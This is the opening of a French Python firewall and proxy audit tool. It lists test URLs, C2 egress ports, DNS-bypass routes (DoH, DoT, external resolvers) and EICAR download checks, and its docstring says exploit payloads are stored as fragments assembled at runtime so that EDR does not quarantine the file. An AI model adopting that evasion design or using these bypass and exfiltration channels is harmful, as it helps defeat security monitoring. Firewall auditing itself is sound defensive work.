#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FirewallTester v4.0 — Audit de pare-feu, proxy et politique web
Windows / Linux / macOS — dépendance unique : requests

Principes de la v4 :
  * chaque test déclare un RÉSULTAT ATTENDU (bloqué / autorisé / discrétionnaire)
  * chaque test produit un RÉSULTAT OBSERVÉ (bloqué / autorisé / non concluant)
  * un test non concluant n'entre PAS dans le score (pas de faux positif silencieux)
  * détection des pages de blocage HTTP 200 (Zscaler, Fortinet, Olfeo, Squid…)
  * mesures de contrôle (baseline) avant l'audit : sans Internet, aucun verdict

Compatibilité antivirus (v4.0.2) :
  Ce fichier ne contient AUCUNE signature antivirus (EICAR), AUCUNE charge
  offensive complète en clair, et AUCUNE routine de déchiffrement/obfuscation.
  - la charge EICAR n'est jamais embarquée : elle est téléchargée à la volée,
    et seulement si l'utilisateur passe --allow-eicar ;
  - les charges d'exploit (WAF) sont stockées en fragments inertes, assemblés
    uniquement à l'exécution.
  Objectif : le script n'est jamais mis en quarantaine au repos par un EDR
  (Sophos Intercept X, Defender…). Voir aussi la section correspondante du README.
"""

import sys, os, re, json, socket, ssl, time, base64, struct, random, html
import datetime, platform, argparse, subprocess, ipaddress, warnings

# Les tests TLS 1.0/1.1 déclenchent des avertissements de dépréciation : c'est
# précisément ce que l'on cherche à mesurer, on ne les affiche donc pas.
warnings.filterwarnings("ignore", category=DeprecationWarning)
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlunparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[ERREUR] Module 'requests' manquant.  ->  pip install requests")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
# CONSOLE (couleurs + encodage)
# ═══════════════════════════════════════════════════════════════════════════════

def _init_console():
    """UTF-8 + séquences ANSI sur Windows."""
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    if platform.system() == "Windows":
        try:
            import ctypes
            k = ctypes.windll.kernel32
            for handle in (-11, -12):                     # STDOUT, STDERR
                h = k.GetStdHandle(handle)
                mode = ctypes.c_uint32()
                if k.GetConsoleMode(h, ctypes.byref(mode)):
                    k.SetConsoleMode(h, mode.value | 0x0004)   # VT processing
        except Exception:
            pass

_init_console()
_NO_COLOR = bool(os.environ.get("NO_COLOR")) or not sys.stdout.isatty()

class C:
    """Palette ANSI (désactivée si NO_COLOR ou sortie redirigée)."""
    RESET = "" if _NO_COLOR else "\033[0m"
    B     = "" if _NO_COLOR else "\033[1m"
    DIM   = "" if _NO_COLOR else "\033[2m"
    RED   = "" if _NO_COLOR else "\033[38;5;203m"
    GREEN = "" if _NO_COLOR else "\033[38;5;114m"
    AMBER = "" if _NO_COLOR else "\033[38;5;215m"
    BLUE  = "" if _NO_COLOR else "\033[38;5;75m"
    CYAN  = "" if _NO_COLOR else "\033[38;5;80m"
    VIO   = "" if _NO_COLOR else "\033[38;5;141m"
    GREY  = "" if _NO_COLOR else "\033[38;5;245m"
    WHITE = "" if _NO_COLOR else "\033[38;5;255m"
    BG_H  = "" if _NO_COLOR else "\033[48;5;236m"

_ANSI_RE = re.compile(r"\033\[[0-9;]*m")

def vislen(s):
    """Longueur affichée (sans les séquences ANSI)."""
    return len(_ANSI_RE.sub("", s))

def vpad(s, width, align="<"):
    """Padding fiable même avec des couleurs ANSI dans la chaîne."""
    fill = max(0, width - vislen(s))
    if align == ">":
        return " " * fill + s
    if align == "^":
        left = fill // 2
        return " " * left + s + " " * (fill - left)
    return s + " " * fill

def vtrunc(s, width):
    """Tronque sur la longueur visible (chaîne sans ANSI attendue)."""
    return s if len(s) <= width else s[: max(0, width - 1)] + "…"

# ═══════════════════════════════════════════════════════════════════════════════
# CONSTANTES
# ═══════════════════════════════════════════════════════════════════════════════

VERSION      = "4.0.2"          # 4.0.2 : aucune charge embarquée ni obfuscation (anti-AV)
CONNECT_TO   = 6          # timeout connexion TCP
READ_TO      = 10         # timeout lecture HTTP
TCP_TO       = 6          # timeout probe TCP brut
MAX_BODY     = 120_000    # octets lus pour l'analyse de page de blocage

# UA navigateur : indispensable, sinon beaucoup d'origines répondent 403
# et l'on attribue au pare-feu un blocage qui vient du site lui-même.
UA_BROWSER = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

MODULE_LABELS = {
    "url":       "URL / Politique web",
    "eicar":     "Malware / EICAR",
    "c2":        "C2 / IP malveillantes",
    "dns":       "Filtrage DNS",
    "ssl":       "Inspection SSL/TLS",
    "app":       "Couche applicative (WAF/IPS)",
    "bypass":    "Contournement de filtrage",
    "proto":     "Protocoles alternatifs",
    "ports":     "Ports non standard",
    "dns_exfil": "Exfiltration DNS",
    "upload":    "Upload de fichiers",
    "bandwidth": "Débit / QoS",
}
ALL_MODULES = list(MODULE_LABELS.keys())

# ── Attendus ──────────────────────────────────────────────────────────────────
#   blocked  : le pare-feu DOIT bloquer            -> compte dans le score
#   allowed  : le pare-feu NE DOIT PAS bloquer     -> compte dans le score
#              (baselines + sites de sécurité : détection de SUR-BLOCAGE)
#   policy   : dépend de la politique interne      -> hors score, taux affiché
#   info     : mesure informative                  -> hors score
EXPECT_BLOCKED = "blocked"
EXPECT_ALLOWED = "allowed"
EXPECT_POLICY  = "policy"
EXPECT_INFO    = "info"

CATEGORY_META = {
    # ── sécurité pure : attendu bloqué ────────────────────────────────────────
    "malware":       dict(label="Malware / Menaces",        color="#dc2626", severity="critical", expected=EXPECT_BLOCKED),
    "phishing":      dict(label="Phishing",                 color="#ea580c", severity="critical", expected=EXPECT_BLOCKED),
    "c2":            dict(label="Command & Control",        color="#b91c1c", severity="critical", expected=EXPECT_BLOCKED),
    "darkweb":       dict(label="Dark web / Tor",           color="#4b5563", severity="critical", expected=EXPECT_BLOCKED),
    "anonymizer":    dict(label="Anonymiseurs / Proxies",   color="#0d9488", severity="major",    expected=EXPECT_BLOCKED),
    "adult":         dict(label="Contenu adulte",           color="#db2777", severity="critical", expected=EXPECT_BLOCKED),
    "gambling":      dict(label="Jeux d'argent",            color="#f97316", severity="major",    expected=EXPECT_BLOCKED),
    "exploit":       dict(label="Exploits / Payloads",      color="#9333ea", severity="critical", expected=EXPECT_BLOCKED),
    # ── discrétionnaire : dépend de la politique du client ────────────────────
    "social_media":  dict(label="Réseaux sociaux",          color="#4f46e5", severity="minor",    expected=EXPECT_POLICY),
    "streaming":     dict(label="Streaming / Média",        color="#059669", severity="minor",    expected=EXPECT_POLICY),
    "ai_llm":        dict(label="IA générative / LLM",      color="#7c3aed", severity="major",    expected=EXPECT_POLICY),
    "crypto":        dict(label="Crypto-monnaies",          color="#d97706", severity="major",    expected=EXPECT_POLICY),
    "vpn":           dict(label="VPN grand public",         color="#0284c7", severity="major",    expected=EXPECT_POLICY),
    "data_exfil":    dict(label="Partage anonyme / Paste",  color="#e11d48", severity="major",    expected=EXPECT_POLICY),
    "file_sharing":  dict(label="Transfert de fichiers",    color="#65a30d", severity="minor",    expected=EXPECT_POLICY),
    "hacking_tools": dict(label="Outils offensifs",         color="#a855f7", severity="major",    expected=EXPECT_POLICY),
    "cloud_pro":     dict(label="Stockage cloud",           color="#2563eb", severity="minor",    expected=EXPECT_POLICY),
    # ── attendu autorisé : détection de sur-blocage ───────────────────────────
    "neutral":       dict(label="Références neutres",       color="#16a34a", severity="none",     expected=EXPECT_ALLOWED),
    "threat_intel":  dict(label="Sécurité / Threat intel",  color="#0891b2", severity="none",     expected=EXPECT_ALLOWED),
    "business":      dict(label="Outils métier",            color="#0369a1", severity="none",     expected=EXPECT_ALLOWED),
}

# Justification affichée dans le rapport pour chaque catégorie hors score.
POLICY_NOTE = ("Catégorie discrétionnaire : le blocage relève de la politique interne du client. "
               "Le taux de blocage est mesuré mais n'entre pas dans la note.")

RECOMMENDATIONS = {
    "malware":       ("Activer le filtrage anti-malware sur le proxy/pare-feu",
                      "Des ressources de test malware standardisées (EICAR, AMTSO, Google Safe Browsing, WiCAR) sont accessibles depuis le poste. "
                      "Le moteur d'analyse de contenu est absent, désactivé, ou ne couvre pas le flux testé."),
    "phishing":      ("Activer la protection anti-phishing",
                      "Les pages de test phishing reconnues par les principaux éditeurs ne sont pas bloquées. "
                      "Le poste n'est protégé que par le navigateur, en aval du pare-feu."),
    "c2":            ("Bloquer les connexions sortantes vers les IP/ports de commande et contrôle",
                      "Des connexions TCP directes vers des ports typiques de C2 aboutissent. "
                      "Un implant sur le poste pourrait établir un canal de contrôle sortant."),
    "darkweb":       ("Bloquer les ressources dark web et les passerelles Tor",
                      "L'accès aux annuaires Tor et aux passerelles d'anonymisation est possible : "
                      "canal d'exfiltration et de contournement complet de la politique."),
    "anonymizer":    ("Bloquer les proxies web et anonymiseurs",
                      "Un anonymiseur accessible annule l'ensemble des autres règles de filtrage URL."),
    "adult":         ("Activer le filtrage de contenu adulte",
                      "Contenu adulte accessible : risque juridique (environnement de travail, harcèlement) "
                      "et exposition à des régies publicitaires à forte densité de malvertising."),
    "gambling":      ("Bloquer les sites de jeux d'argent",
                      "Sites de paris accessibles : risque de conformité et vecteur classique de fraude/malvertising."),
    "exploit":       ("Activer l'IPS sur les flux sortants",
                      "Des pages de test d'exploitation (drive-by download, PDF piégé, mineur JS) sont téléchargeables."),
    "social_media":  ("Cadrer l'usage des réseaux sociaux",
                      "Réseaux sociaux accessibles sans restriction : vecteur de phishing ciblé et de fuite d'information."),
    "streaming":     ("Encadrer le streaming",
                      "Plateformes de streaming accessibles : consommation de bande passante non maîtrisée."),
    "ai_llm":        ("Définir une politique d'usage des IA génératives",
                      "L'accès non contrôlé aux LLM grand public expose à la fuite de données confidentielles "
                      "(code source, données clients) hors du périmètre de l'entreprise."),
    "crypto":        ("Bloquer les plateformes crypto",
                      "Exchanges accessibles : cryptojacking, contournement des règles financières internes."),
    "vpn":           ("Contrôler les VPN grand public",
                      "Un client VPN externe crée un tunnel chiffré qui échappe totalement à l'inspection."),
    "data_exfil":    ("Bloquer les services de paste et de transfert anonyme",
                      "Pastebin, transfer.sh et équivalents sont les canaux d'exfiltration les plus utilisés, "
                      "car ils ne nécessitent aucune authentification."),
    "file_sharing":  ("Encadrer les services de transfert de fichiers",
                      "Transfert de fichiers volumineux vers l'extérieur sans traçabilité."),
    "hacking_tools": ("Restreindre les sites d'outillage offensif",
                      "Sites d'exploits et de reconnaissance accessibles depuis un poste bureautique."),
    "cloud_pro":     ("Restreindre le stockage cloud aux tenants de l'entreprise",
                      "Le stockage cloud personnel permet la copie de données hors du SI."),
}

# ═══════════════════════════════════════════════════════════════════════════════
# MODÈLE DE RÉSULTAT
# ═══════════════════════════════════════════════════════════════════════════════

OBS_BLOCKED      = "blocked"
OBS_ALLOWED      = "allowed"
OBS_INCONCLUSIVE = "inconclusive"

CONF_CERTAIN   = "certain"
CONF_PROBABLE  = "probable"
CONF_WEAK      = "faible"

def new_result(module, name, target, category="", expected=EXPECT_BLOCKED,
               description="", source=""):
    return {
        "module": module, "name": name, "target": str(target),
        "category": category, "expected": expected,
        "observed": OBS_INCONCLUSIVE, "verdict": "warn",
        "confidence": CONF_WEAK,
        "details": "", "evidence": "", "vendor": "",
        "http_code": None, "duration_ms": 0,
        "description": description, "source": source,
        "extra": {},
    }

def set_obs(r, observed, confidence, details, evidence="", vendor=""):
    r["observed"]   = observed
    r["confidence"] = confidence
    r["details"]    = details
    if evidence:
        r["evidence"] = evidence
    if vendor:
        r["vendor"] = vendor
    return r

def finalize(r, t0):
    """Calcule le verdict à partir de (attendu, observé) et horodate."""
    exp, obs = r["expected"], r["observed"]
    if exp == EXPECT_INFO:
        r["verdict"] = "info"
    elif obs == OBS_INCONCLUSIVE:
        r["verdict"] = "warn"
    elif exp == EXPECT_POLICY:
        r["verdict"] = "policy_blocked" if obs == OBS_BLOCKED else "policy_allowed"
    else:
        r["verdict"] = "pass" if obs == exp else "fail"
    r["duration_ms"] = round((time.time() - t0) * 1000)
    return r

def is_scored(r):
    return r["verdict"] in ("pass", "fail")

def category_expected(cat, policy_override=None):
    meta = CATEGORY_META.get(cat, {})
    exp  = meta.get("expected", EXPECT_BLOCKED)
    if policy_override and cat in policy_override:
        v = str(policy_override[cat]).lower()
        if v in ("blocked", "bloque", "bloqué", "block", "deny"):   exp = EXPECT_BLOCKED
        elif v in ("allowed", "autorise", "autorisé", "allow"):     exp = EXPECT_ALLOWED
        elif v in ("policy", "ignore", "na"):                       exp = EXPECT_POLICY
    return exp

# ═══════════════════════════════════════════════════════════════════════════════
# CORPUS DE TESTS
# ═══════════════════════════════════════════════════════════════════════════════
# Chaque ressource est soit un site réel de la catégorie, soit une ressource de
# test PUBLIÉE POUR ÊTRE TESTÉE (EICAR, AMTSO, Google Safe Browsing, WiCAR,
# domaines de test Cisco Umbrella). Aucun malware réel n'est téléchargé.
# Les éditeurs de sécurité (Malwarebytes, abuse.ch, PhishTank…) sont classés en
# « threat_intel » : les bloquer est un DÉFAUT de paramétrage, pas une réussite.

URL_FILTER_TESTS = [
    # ── Malware : ressources de test standardisées ────────────────────────────
    ("Google Safe Browsing — page malware",  "https://testsafebrowsing.appspot.com/s/malware.html",   "malware",  "Google (page de test officielle)"),
    ("Google Safe Browsing — logiciel indésirable", "https://testsafebrowsing.appspot.com/s/unwanted.html", "malware", "Google (page de test officielle)"),
    ("WiCAR — page de test malware",         "https://www.wicar.org/test-malware.html",               "malware",  "WiCAR (banc de test AV)"),
    ("WiCAR — domaine de test",              "http://malware.wicar.org/",                             "malware",  "WiCAR (banc de test AV)"),
    ("AMTSO — banc de test sécurité",        "https://www.amtso.org/security-features-check/",        "malware",  "AMTSO (consortium éditeurs AV)"),
    ("Umbrella test — examplemalwaredomain", "http://www.examplemalwaredomain.com/",                  "malware",  "Cisco Umbrella (domaine de test)"),
    ("Umbrella test — examplebotnetdomain",  "http://www.examplebotnetdomain.com/",                   "malware",  "Cisco Umbrella (domaine de test)"),
    # ── Phishing ──────────────────────────────────────────────────────────────
    ("Google Safe Browsing — page phishing", "https://testsafebrowsing.appspot.com/s/phishing.html",  "phishing", "Google (page de test officielle)"),
    ("Umbrella test — internetbadguys.com",  "http://www.internetbadguys.com/",                       "phishing", "Cisco Umbrella (domaine de test)"),
    ("AMTSO — test page de phishing",        "https://www.amtso.org/feature-settings-check-phishing-page/", "phishing", "AMTSO"),
    # ── Exploits / drive-by ───────────────────────────────────────────────────
    ("WiCAR — mineur crypto JavaScript",     "https://malware.wicar.org/data/js_crypto_miner.html",   "exploit", "WiCAR"),
    ("WiCAR — exploit OLE (MS14-064)",       "https://malware.wicar.org/data/ms14_064_ole_not_xp.html", "exploit", "WiCAR"),
    ("WiCAR — exploit Java (JRE17)",         "https://malware.wicar.org/data/java_jre17_exec.html",   "exploit", "WiCAR"),
    ("AMTSO — drive-by download",            "https://www.amtso.org/feature-settings-check-drive-by-download-test/", "exploit", "AMTSO"),
    ("AMTSO — application indésirable",      "https://www.amtso.org/feature-settings-check-potentially-unwanted-applications/", "exploit", "AMTSO"),
    # ── Threat intel / éditeurs (NE DOIVENT PAS être bloqués) ─────────────────
    ("Malwarebytes (éditeur AV)",            "https://www.malwarebytes.com/blog",                     "threat_intel", "Éditeur antivirus"),
    ("abuse.ch — URLhaus",                   "https://urlhaus.abuse.ch/",                             "threat_intel", "Threat intel"),
    ("PhishTank",                            "https://phishtank.org/",                                "threat_intel", "Threat intel"),
    ("VirusTotal",                           "https://www.virustotal.com/",                           "threat_intel", "Analyse de fichiers"),
    ("CERT-FR (ANSSI)",                      "https://www.cert.ssi.gouv.fr/",                         "threat_intel", "CERT national"),
    ("MITRE ATT&CK",                         "https://attack.mitre.org/",                             "threat_intel", "Référentiel"),
    ("NVD / NIST (CVE)",                     "https://nvd.nist.gov/",                                 "threat_intel", "Base de vulnérabilités"),
    ("CVE Program (MITRE)",                  "https://www.cve.org/",                                  "threat_intel", "Base de vulnérabilités"),
    # ── Contenu adulte ────────────────────────────────────────────────────────
    ("Pornhub",       "https://www.pornhub.com",     "adult", ""),
    ("XVideos",       "https://www.xvideos.com",     "adult", ""),
    ("xHamster",      "https://xhamster.com",        "adult", ""),
    ("YouPorn",       "https://www.youporn.com",     "adult", ""),
    ("RedTube",       "https://www.redtube.com",     "adult", ""),
    ("OnlyFans",      "https://onlyfans.com",        "adult", ""),
    ("Brazzers",      "https://www.brazzers.com",    "adult", ""),
    ("LiveJasmin",    "https://www.livejasmin.com",  "adult", ""),
    ("Chaturbate",    "https://chaturbate.com",      "adult", ""),
    ("Stripchat",     "https://stripchat.com",       "adult", ""),
    ("BongaCams",     "https://bongacams.com",       "adult", ""),
    ("MyFreeCams",    "https://www.myfreecams.com",  "adult", ""),
    # ── Jeux d'argent ─────────────────────────────────────────────────────────
    ("Winamax",           "https://www.winamax.fr",           "gambling", ""),
    ("Betclic",           "https://www.betclic.fr",           "gambling", ""),
    ("Unibet",            "https://www.unibet.fr",            "gambling", ""),
    ("PMU",               "https://www.pmu.fr",               "gambling", ""),
    ("ParionsSport FDJ",  "https://www.parionssport.fdj.fr",  "gambling", ""),
    ("PokerStars",        "https://www.pokerstars.com",       "gambling", ""),
    ("Bet365",            "https://www.bet365.com",           "gambling", ""),
    ("gambling.com",      "https://www.gambling.com",         "gambling", ""),
    ("Betway",            "https://betway.com",               "gambling", ""),
    # ── Dark web / Tor ────────────────────────────────────────────────────────
    ("Tor — page de vérification", "https://check.torproject.org/",  "darkweb", ""),
    ("Ahmia (moteur .onion)",      "https://ahmia.fi",               "darkweb", ""),
    ("dark.fail (annuaire)",       "https://dark.fail",              "darkweb", ""),
    ("The Hidden Wiki (miroir)",   "https://thehiddenwiki.org",      "darkweb", ""),
    ("Tor Metrics",                "https://metrics.torproject.org", "darkweb", ""),
    ("I2P Project",                "https://geti2p.net",             "darkweb", ""),
    ("Freenet / Hyphanet",         "https://www.hyphanet.org",       "darkweb", ""),
    # ── Anonymiseurs / proxies web ────────────────────────────────────────────
    ("Tor Project (téléchargement)", "https://www.torproject.org/download/", "anonymizer", ""),
    ("ProxySite",                    "https://www.proxysite.com",           "anonymizer", ""),
    ("CroxyProxy",                   "https://www.croxyproxy.com",          "anonymizer", ""),
    ("hide.me — proxy web",          "https://hide.me/en/proxy",            "anonymizer", ""),
    ("KProxy",                       "https://www.kproxy.com/index.html",   "anonymizer", ""),
    ("Psiphon",                      "https://www.psiphon3.com",            "anonymizer", ""),
    # ── VPN grand public ──────────────────────────────────────────────────────
    ("NordVPN",     "https://nordvpn.com",           "vpn", ""),
    ("ExpressVPN",  "https://www.expressvpn.com",    "vpn", ""),
    ("Proton VPN",  "https://protonvpn.com",         "vpn", ""),
    ("Mullvad",     "https://mullvad.net",           "vpn", ""),
    ("Surfshark",   "https://surfshark.com",         "vpn", ""),
    ("Windscribe",  "https://windscribe.com",        "vpn", ""),
    # ── Exfiltration / paste ──────────────────────────────────────────────────
    ("Pastebin",     "https://pastebin.com",     "data_exfil", ""),
    ("rentry.co",    "https://rentry.co",        "data_exfil", ""),
    ("gofile.io",    "https://gofile.io",        "data_exfil", ""),
    ("file.io",      "https://www.file.io",      "data_exfil", ""),
    ("0x0.st",       "https://0x0.st",           "data_exfil", ""),
    ("catbox.moe",   "https://catbox.moe",       "data_exfil", ""),
    ("JustPaste.it", "https://justpaste.it",     "data_exfil", ""),
    # ── Transfert de fichiers ─────────────────────────────────────────────────
    ("WeTransfer",  "https://wetransfer.com",       "file_sharing", ""),
    ("Mega.nz",     "https://mega.nz",              "file_sharing", ""),
    ("MediaFire",   "https://www.mediafire.com",    "file_sharing", ""),
    ("SwissTransfer","https://www.swisstransfer.com","file_sharing", ""),
    # ── Outils offensifs ──────────────────────────────────────────────────────
    ("Exploit-DB",   "https://www.exploit-db.com",  "hacking_tools", ""),
    ("Shodan",       "https://www.shodan.io",       "hacking_tools", ""),
    ("Kali Linux",   "https://www.kali.org",        "hacking_tools", ""),
    ("HackForums",   "https://hackforums.net",      "hacking_tools", ""),
    ("Metasploit",   "https://www.metasploit.com",  "hacking_tools", ""),
    ("Packet Storm", "https://packetstormsecurity.com", "hacking_tools", ""),
    # ── Réseaux sociaux ───────────────────────────────────────────────────────
    ("TikTok",        "https://www.tiktok.com",     "social_media", ""),
    ("Instagram",     "https://www.instagram.com",  "social_media", ""),
    ("Facebook",      "https://www.facebook.com",   "social_media", ""),
    ("X / Twitter",   "https://x.com",              "social_media", ""),
    ("Snapchat",      "https://www.snapchat.com",   "social_media", ""),
    ("Reddit",        "https://www.reddit.com",     "social_media", ""),
    ("Pinterest",     "https://www.pinterest.com",  "social_media", ""),
    ("Twitch",        "https://www.twitch.tv",      "social_media", ""),
    ("Discord",       "https://discord.com",        "social_media", ""),
    ("Telegram Web",  "https://web.telegram.org",   "social_media", ""),
    ("WhatsApp Web",  "https://web.whatsapp.com",   "social_media", ""),
    ("Signal",        "https://signal.org",         "social_media", ""),
    ("Mastodon",      "https://mastodon.social",    "social_media", ""),
    ("LinkedIn",      "https://www.linkedin.com",   "social_media", ""),
    # ── Streaming ─────────────────────────────────────────────────────────────
    ("YouTube",     "https://www.youtube.com",      "streaming", ""),
    ("Netflix",     "https://www.netflix.com",      "streaming", ""),
    ("Disney+",     "https://www.disneyplus.com",   "streaming", ""),
    ("Prime Video", "https://www.primevideo.com",   "streaming", ""),
    ("Spotify",     "https://open.spotify.com",     "streaming", ""),
    ("Deezer",      "https://www.deezer.com",       "streaming", ""),
    ("Dailymotion", "https://www.dailymotion.com",  "streaming", ""),
    ("Canal+",      "https://www.canalplus.com",    "streaming", ""),
    ("Molotov TV",  "https://www.molotov.tv",       "streaming", ""),
    # ── IA générative ─────────────────────────────────────────────────────────
    ("ChatGPT",             "https://chatgpt.com",              "ai_llm", ""),
    ("Claude (Anthropic)",  "https://claude.ai",                "ai_llm", ""),
    ("Google Gemini",       "https://gemini.google.com",        "ai_llm", ""),
    ("Microsoft Copilot",   "https://copilot.microsoft.com",    "ai_llm", ""),
    ("Mistral — Le Chat",   "https://chat.mistral.ai",          "ai_llm", ""),
    ("Perplexity",          "https://www.perplexity.ai",        "ai_llm", ""),
    ("Hugging Face",        "https://huggingface.co",           "ai_llm", ""),
    ("DeepSeek",            "https://www.deepseek.com",         "ai_llm", ""),
    # ── Crypto ────────────────────────────────────────────────────────────────
    ("Binance",        "https://www.binance.com",     "crypto", ""),
    ("Coinbase",       "https://www.coinbase.com",    "crypto", ""),
    ("Kraken",         "https://www.kraken.com",      "crypto", ""),
    ("Bybit",          "https://www.bybit.com",       "crypto", ""),
    ("OKX",            "https://www.okx.com",         "crypto", ""),
    ("KuCoin",         "https://www.kucoin.com",      "crypto", ""),
    ("Etherscan",      "https://etherscan.io",        "crypto", ""),
    ("CoinMarketCap",  "https://coinmarketcap.com",   "crypto", ""),
    # ── Stockage cloud ────────────────────────────────────────────────────────
    ("Dropbox",       "https://www.dropbox.com",     "cloud_pro", ""),
    ("Google Drive",  "https://drive.google.com",    "cloud_pro", ""),
    ("OneDrive",      "https://onedrive.live.com",   "cloud_pro", ""),
    ("Box",           "https://www.box.com",         "cloud_pro", ""),
    ("iCloud",        "https://www.icloud.com",      "cloud_pro", ""),
    ("pCloud",        "https://www.pcloud.com",      "cloud_pro", ""),
    # ── Références neutres (ne doivent jamais être bloquées) ──────────────────
    ("Google",              "https://www.google.com",        "neutral", "Baseline"),
    ("Microsoft",           "https://www.microsoft.com",     "neutral", "Baseline"),
    ("Wikipédia",           "https://fr.wikipedia.org",      "neutral", "Baseline"),
    ("service-public.fr",   "https://www.service-public.fr", "neutral", "Baseline"),
    # ── Outils métier (sur-blocage fréquent) ──────────────────────────────────
    ("Microsoft 365",   "https://www.office.com",          "business", ""),
    ("GitHub",          "https://github.com",              "business", ""),
    ("Teams",           "https://teams.microsoft.com",     "business", ""),
    ("Zoom",            "https://zoom.us",                 "business", ""),
    ("Catalogue Windows Update", "https://www.catalog.update.microsoft.com/Home.aspx", "business", ""),
]

# ── Malware / EICAR : téléchargement effectif du fichier de test ──────────────
# (nom, url, attendu, description)
EICAR_TESTS = [
    ("EICAR — HTTPS (eicar.org)",  "https://secure.eicar.org/eicar.com",                "EICAR sur TLS : invisible sans inspection SSL"),
    ("EICAR — HTTP en clair",      "http://secure.eicar.org/eicar.com",                 "Même fichier sans chiffrement : détectable par simple analyse"),
    ("EICAR — extension .txt",     "https://secure.eicar.org/eicar.com.txt",            "Charge identique, extension inoffensive"),
    ("EICAR — archive ZIP",        "https://secure.eicar.org/eicar_com.zip",            "Teste l'analyse des conteneurs compressés"),
    ("EICAR — miroir WiCAR (HTTPS)", "https://malware.wicar.org/data/eicar.com",        "Second hébergeur : évite un faux négatif dû à une seule source"),
    ("EICAR — miroir WiCAR (HTTP)",  "http://malware.wicar.org/data/eicar.com",         "Miroir en clair"),
]

# ── C2 / egress : (nom, hôte, port, catégorie, attendu, description) ──────────
# On teste des ports/comportements, pas de fausses « IP malveillantes » : une IP
# de C2 réelle est éphémère et produirait des verdicts aléatoires.
C2_TESTS = [
    ("Tor — annuaire moria1 (ORPort)", "128.31.0.39",   9101, "darkweb",  EXPECT_BLOCKED, "Autorité d'annuaire Tor — sortie Tor directe"),
    ("Tor — annuaire dizum",           "45.66.33.45",   443,  "darkweb",  EXPECT_BLOCKED, "Autorité d'annuaire Tor sur 443 (indétectable par port)"),
    ("Tor — annuaire maatuska",        "171.25.193.9",  80,   "darkweb",  EXPECT_BLOCKED, "Autorité d'annuaire Tor sur 80"),
    ("IRC en clair (6667)",            "irc.libera.chat", 6667, "c2",     EXPECT_BLOCKED, "Canal de contrôle historique des botnets"),
    ("IRC TLS (6697)",                 "irc.libera.chat", 6697, "c2",     EXPECT_BLOCKED, "IRC chiffré"),
    ("Telnet sortant (23)",            "telehack.com",  23,   "c2",       EXPECT_BLOCKED, "Protocole en clair, aucun usage bureautique"),
    ("Bogon RFC6598 (CGNAT)",          "100.64.0.1",    80,   "c2",       EXPECT_BLOCKED, "Plage non routable : doit être filtrée en sortie"),
    ("SMB sortant (445)",              "portquiz.net",  445,  "c2",       EXPECT_BLOCKED, "SMB vers Internet — vecteur de fuite NTLM"),
    ("RDP sortant (3389)",             "portquiz.net",  3389, "c2",       EXPECT_BLOCKED, "RDP sortant direct"),
    ("Port haut arbitraire (31337)",   "portquiz.net",  31337,"c2",       EXPECT_BLOCKED, "Egress sur port haut : canal C2 générique"),
    ("HTTPS 443 (contrôle)",           "portquiz.net",  443,  "neutral",  EXPECT_ALLOWED, "Contrôle : doit rester ouvert"),
]

# ── DNS : dicts, plusieurs natures de test ───────────────────────────────────
DNS_TESTS = [
    dict(name="Résolution malware (WiCAR)",        kind="resolve",  target="malware.wicar.org",        category="malware",      expected=EXPECT_BLOCKED),
    dict(name="Résolution test Umbrella (botnet)", kind="resolve",  target="www.examplebotnetdomain.com", category="malware",   expected=EXPECT_BLOCKED),
    dict(name="Résolution test Umbrella (phish)",  kind="resolve",  target="www.internetbadguys.com",  category="phishing",     expected=EXPECT_BLOCKED),
    dict(name="Résolution domaine adulte",         kind="resolve",  target="www.pornhub.com",          category="adult",        expected=EXPECT_BLOCKED),
    dict(name="Résolution annuaire Tor",           kind="resolve",  target="ahmia.fi",                 category="darkweb",      expected=EXPECT_BLOCKED),
    dict(name="Résolution google.com (contrôle)",  kind="resolve",  target="www.google.com",           category="neutral",      expected=EXPECT_ALLOWED),
    dict(name="Résolution microsoft.com (contrôle)",kind="resolve", target="www.microsoft.com",        category="neutral",      expected=EXPECT_ALLOWED),
    dict(name="Domaine inexistant (DGA)",          kind="resolve",  target="qz7x2k9v4m1p8w3t.com",     category="malware",      expected=EXPECT_INFO,
         description="NXDOMAIN attendu naturellement — sert à identifier le comportement du résolveur (NXDOMAIN vs page de garde)"),
    dict(name="DNS externe direct — Google 8.8.8.8",     kind="udp53", target="8.8.8.8",   category="anonymizer", expected=EXPECT_BLOCKED,
         description="Un poste ne doit interroger que les résolveurs internes"),
    dict(name="DNS externe direct — Cloudflare 1.1.1.1", kind="udp53", target="1.1.1.1",   category="anonymizer", expected=EXPECT_BLOCKED),
    dict(name="DNS externe direct — Quad9 9.9.9.9",      kind="udp53", target="9.9.9.9",   category="anonymizer", expected=EXPECT_BLOCKED),
    dict(name="DNS sur TCP/53 externe",                  kind="tcp53", target="1.1.1.1",   category="anonymizer", expected=EXPECT_BLOCKED),
    dict(name="DoH — Cloudflare",   kind="doh", target="https://cloudflare-dns.com/dns-query", category="anonymizer", expected=EXPECT_BLOCKED,
         description="DNS over HTTPS : contourne intégralement le filtrage DNS"),
    dict(name="DoH — Google",       kind="doh", target="https://dns.google/resolve",           category="anonymizer", expected=EXPECT_BLOCKED),
    dict(name="DoH — Quad9",        kind="doh", target="https://dns.quad9.net/dns-query",     category="anonymizer", expected=EXPECT_BLOCKED),
    dict(name="DoH — NextDNS",      kind="doh", target="https://dns.nextdns.io/dns-query",    category="anonymizer", expected=EXPECT_BLOCKED),
    dict(name="DoT — Cloudflare (853)", kind="dot", target="1.1.1.1", category="anonymizer", expected=EXPECT_BLOCKED,
         description="DNS over TLS sur le port 853"),
]

# ── SSL / TLS : (nom, hôte, port, nature, attendu, description) ──────────────
SSL_TESTS = [
    ("Certificat valide — Google",     "www.google.com",            443,  "valid",          EXPECT_ALLOWED, "Contrôle : doit passer"),
    ("Certificat valide — Microsoft",  "www.microsoft.com",         443,  "valid",          EXPECT_ALLOWED, "Contrôle : doit passer"),
    ("Certificat expiré",              "expired.badssl.com",        443,  "expired",        EXPECT_BLOCKED, "Le proxy doit refuser de relayer"),
